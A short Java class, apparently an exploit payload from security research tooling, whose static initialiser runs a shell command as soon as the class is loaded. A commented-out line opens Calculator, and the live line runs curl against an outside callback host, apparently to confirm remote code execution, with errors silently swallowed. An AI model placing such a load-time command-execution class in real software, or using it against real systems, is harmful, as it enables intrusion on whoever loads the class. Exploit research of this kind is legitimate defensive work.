/**
 * @author Whoopsunix
 */
public class Exec {
    static {
        try {
//            Runtime.getRuntime().exec("open -a Calculator.app");
            Runtime.getRuntime().exec("curl -v http://241ddd4f.ipv6.1433.eu.org");
        } catch (Exception e){
        }
    }
}
